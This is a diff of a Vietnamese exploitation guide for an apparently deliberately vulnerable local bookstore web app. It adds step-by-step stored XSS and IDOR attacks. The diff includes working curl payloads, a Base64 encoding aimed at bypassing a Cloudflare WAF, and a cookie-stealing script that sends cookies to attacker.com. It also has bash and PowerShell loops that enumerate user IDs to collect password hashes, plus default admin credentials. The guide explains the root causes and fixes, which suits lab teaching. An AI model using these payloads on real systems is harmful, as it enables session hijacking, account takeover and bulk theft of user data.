@@ -201,29 +201,97 @@ curl "http://localhost:8081/api/books/search?b64q=dGVzdCUnKSBBTkQgMT0wIFVOSU9OIF
 ## 2. 🔴 Stored XSS (Cross-Site Scripting lưu trữ)
 
 ### Mô tả
-Hệ thống review sách cho phép **bất kỳ user đã đăng nhập** gửi đánh giá (không cần mua hàng). Nội dung review được lưu vào DB **không sanitize**.
+Hệ thống review sách cho phép **bất kỳ user đã đăng nhập** gửi đánh giá (không cần mua hàng). Nội dung review được lưu vào DB **không sanitize**, và khi hiển thị trên trang chi tiết sách (`book-detail.jsp`), nội dung được render trực tiếp qua `${r.comment}` (EL Expression) **không escape HTML**.
 
-### Hướng dẫn khai thác (Bypass WAF bằng Base64)
+**File liên quan:**
+- `ReviewDAO.java` (dòng 39-68): Lưu content vào DB không filter
+- `ReviewServlet.java` (dòng 194-200): Hỗ trợ `contentBase64` decode trực tiếp
+- `book-detail.jsp` (dòng 266): Render `${r.comment}` không dùng `<c:out>` hoặc `fn:escapeXml()`
 
-**Bước 1 - Đăng nhập lấy token:**
+### Hướng dẫn khai thác chi tiết (Step-by-step)
+
+---
+
+#### 🔹 Bước 1: Đăng nhập lấy JWT Token
+
+> **⚠️ Lưu ý:** API login nhận `username` (tên đăng nhập), **KHÔNG phải email**.
+> Bạn có thể dùng tài khoản admin mặc định: `admin01` / `123456`, hoặc đăng ký tài khoản mới.
+
+**Đăng ký tài khoản test (nếu chưa có):**
+```bash
+curl -X POST http://localhost:8081/api/auth/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"testxss01","email":"testxss01@test.com","password":"123456"}'
 ```
-POST /api/login
-{"username": "user@example.com", "password": "password"}
+
+**Đăng nhập lấy token:**
+```bash
+curl -X POST http://localhost:8081/api/login \
+  -d "username=testxss01&password=123456"
 ```
 
-**Bước 2 - Gửi review chứa XSS payload (Dùng `contentBase64`):**
-- Payload gốc: `<script>alert('XSS')</script>`
-- Base64 Encode: `PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
+**Kết quả trả về:**
+```json
+{"token":"eyJhbGciOiJIUzI1NiJ9...","message":"Login successful","role":"customer"}
+```
+→ Copy giá trị `token` để dùng ở bước sau.
+
+---
+
+#### 🔹 Bước 2: Gửi review chứa XSS payload
+
+**Cách 1 — Gửi trực tiếp (Localhost, không qua WAF):**
 ```bash
 curl -X POST http://localhost:8081/api/reviews \
   -H "Authorization: Bearer <TOKEN>" \
   -H "Content-Type: application/json" \
-  -d '{"bookId":1,"rating":5,"contentBase64":"PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="}'
+  -d '{"bookId":1,"rating":5,"content":"<script>alert(\"XSS Stored\")</script>"}'
 ```
 
-**Bước 3 - Trigger XSS:**
-Truy cập trang chi tiết sách: `http://localhost:8081/books/detail?id=1`
-→ Script trong review sẽ thực thi trên trình duyệt!
+**Cách 2 — Bypass WAF bằng Base64 (Cloudflare Tunnel):**
+- Payload gốc: `<script>alert('XSS Stored')</script>`
+- Base64 Encode: `PHNjcmlwdD5hbGVydCgnWFNTIFN0b3JlZCcpPC9zY3JpcHQ+`
+```bash
+curl -X POST http://localhost:8081/api/reviews \
+  -H "Authorization: Bearer <TOKEN>" \
+  -H "Content-Type: application/json" \
+  -d '{"bookId":1,"rating":5,"contentBase64":"PHNjcmlwdD5hbGVydCgnWFNTIFN0b3JlZCcpPC9zY3JpcHQ+"}'
+```
+
+**Kết quả trả về:**
+```json
+{"success":true,"review":{"id":123,"userId":5,"bookId":1,"rating":5,"content":"<script>alert('XSS Stored')</script>","createdAt":"..."}}
+```
+→ Server đã lưu `<script>` vào database **không filter**!
+
+---
+
+#### 🔹 Bước 3: Trigger XSS — Mở trang chi tiết sách
+
+Truy cập URL trên trình duyệt:
+```
+http://localhost:8081/books/detail?id=1
+```
+
+→ Khi trình duyệt render phần đánh giá, đoạn `<script>alert('XSS Stored')</script>` sẽ **thực thi tự động** và hiện hộp thoại alert.
+
+> **📌 Tại sao XSS hoạt động?**
+> File `book-detail.jsp` dòng 266 dùng `${r.comment}` — đây là EL Expression output trực tiếp, **KHÔNG** escape HTML.
+> Nếu dùng `<c:out value="${r.comment}"/>` hoặc `${fn:escapeXml(r.comment)}` thì sẽ an toàn.
+
+---
+
+#### 🔹 Bước 4 (Nâng cao): Cookie Stealing payload
+
+```bash
+# Payload lấy cookie và gửi về server của attacker
+curl -X POST http://localhost:8081/api/reviews \
+  -H "Authorization: Bearer <TOKEN>" \
+  -H "Content-Type: application/json" \
+  -d '{"bookId":2,"rating":5,"content":"<script>new Image().src=\"https://attacker.com/steal?c=\"+document.cookie</script>"}'
+```
+
+→ Khi bất kỳ user nào xem sách id=2, cookie của họ sẽ bị gửi đến attacker.
 
 ---
 
@@ -245,14 +313,116 @@ http://localhost:8081/api/books/search?b64q=PHNjcmlwdD5hbGVydCgnWFNTIFJlZmxlY3Rl
 ## 4. 🟠 IDOR (Insecure Direct Object Reference)
 
 ### Mô tả
-Endpoint `/api/profile/user-info` lộ toàn bộ thông tin tài khoản của user khác (gồm cả **password_hash**).
-Lỗ hổng này **không bị Cloudflare WAF chặn**.
+**IDOR (Insecure Direct Object Reference)** là lỗ hổng xảy ra khi ứng dụng cho phép người dùng truy cập tài nguyên của người khác bằng cách **thay đổi giá trị tham số** (ví dụ: `userId=1` → `userId=2`) mà **không kiểm tra quyền sở hữu**.
 
-### Khai thác (CẦN đăng nhập)
+Trong JVA Bookstore, endpoint **`GET /api/profile/user-info?userId=X`** cho phép bất kỳ user đã đăng nhập nào xem thông tin **TẤT CẢ user khác**, bao gồm cả:
+- `username`, `email` (thông tin cá nhân)
+- `password_hash` (mã băm mật khẩu — **cực kỳ nguy hiểm**)
+- `role` (vai trò: admin/seller/customer)
+- `status` (trạng thái tài khoản)
+
+Lỗ hổng này **không bị Cloudflare WAF chặn** vì request hoàn toàn hợp lệ về mặt cú pháp.
+
+**So sánh endpoint an toàn vs lỗ hổng:**
+
+| Endpoint | An toàn? | Giải thích |
+|---|---|---|
+| `GET /api/profile` | ✅ An toàn | Trả về thông tin **của chính mình** (dựa vào JWT token) |
+| `GET /api/profile/user-info?userId=X` | ❌ Lỗ hổng IDOR | Trả về thông tin **bất kỳ user nào** — chỉ cần biết `userId` |
+
+**File liên quan:**
+- `ProfileServlet.java` (dòng 1120-1177): Method `getAnyUserProfile()` — lấy `userId` từ parameter, truy vấn DB trực tiếp **không kiểm tra quyền**.
+
+### Hướng dẫn khai thác chi tiết (Step-by-step)
+
+---
+
+#### 🔹 Bước 1: Đăng nhập lấy JWT Token (bằng tài khoản BẤT KỲ)
+
 ```bash
-# Lấy file hash của admin (userId 1)
-curl -H "Authorization: Bearer <YOUR_TOKEN>" "http://localhost:8081/api/profile/user-info?userId=1"
+# Dùng tài khoản đã đăng ký hoặc tài khoản có sẵn
+curl -X POST http://localhost:8081/api/login \
+  -d "username=testxss01&password=123456"
 ```
+→ Copy giá trị `token` từ response.
+
+---
+
+#### 🔹 Bước 2: Xem thông tin CỦA MÌNH (endpoint an toàn)
+
+```bash
+curl -H "Authorization: Bearer <TOKEN>" "http://localhost:8081/api/profile"
+```
+
+**Kết quả:** Trả về thông tin của chính bạn (email, fullName, phone) — **KHÔNG** có `password_hash`.
+
+---
+
+#### 🔹 Bước 3: Khai thác IDOR — Xem thông tin ADMIN
+
+> **Lưu ý:** userId trong DB thường không bắt đầu từ 1. Bạn có thể dùng SQL Injection (mục 1, bước 7) để tìm các userId thực tế, hoặc brute force (bước 4).
+
+```bash
+# Ví dụ: admin01 có userId=232 trong DB demo
+curl -H "Authorization: Bearer <TOKEN>" "http://localhost:8081/api/profile/user-info?userId=232"
+```
+
+**Kết quả kỳ vọng:**
+```json
+{
+  "success": true,
+  "user": {
+    "id": 232,
+    "username": "admin01",
+    "email": "admin01@gmail.com",
+    "passwordHash": "$2a$10$E5JF.8aU63NZIDWSN//bL.Mzlf7Sc4vw6oT.fXWoQDEK9BBJw7WHm",
+    "role": "admin",
+    "status": "active",
+    "createdAt": "Oct 17, 2025, 5:07:04 PM"
+  }
+}
+```
+→ **Nguy hiểm:** Attacker có được `passwordHash` của admin → có thể thử crack offline bằng hashcat/john.
+
+---
+
+#### 🔹 Bước 4: Brute force — Duyệt qua nhiều userId
+
+```bash
+# Duyệt userId từ 190 đến 650 để tìm tất cả user (phạm vi ID tùy database)
+for i in $(seq 190 650); do
+  result=$(curl -s -H "Authorization: Bearer <TOKEN>" "http://localhost:8081/api/profile/user-info?userId=$i")
+  echo "$result" | grep -q '"success":true' && echo "User ID $i: $result"
+done
+```
+
+**Trên Windows (PowerShell):**
+```powershell
+$token = "<TOKEN>"
+190..650 | ForEach-Object {
+  try {
+    $r = Invoke-RestMethod -Uri "http://localhost:8081/api/profile/user-info?userId=$_" -Headers @{Authorization="Bearer $token"}
+    Write-Host "User ID $_ : $($r.user.username) | $($r.user.email) | role=$($r.user.role)"
+  } catch {}
+}
+```
+
+→ Kết quả: Lấy được **toàn bộ** username, email, password_hash, role của tất cả user trong hệ thống.
+
+---
+
+#### 🔹 Bước 5 (Nâng cao): Kết hợp với SQL Injection
+
+Sau khi có `password_hash` từ IDOR, attacker có thể:
+1. Crack hash offline → lấy mật khẩu gốc
+2. Đăng nhập bằng tài khoản admin
+3. Kết hợp với SQL Injection (Bước 7 ở mục 1) để so sánh kết quả
+
+> **📌 Tại sao IDOR nguy hiểm?**
+> - Không cần kỹ thuật cao — chỉ cần thay số `userId`
+> - Không bị WAF phát hiện — request hoàn toàn bình thường
+> - Lộ `password_hash` → dẫn đến Account Takeover
+> - Có thể tự động hóa (brute force) để lấy toàn bộ user database
 
 ---
 
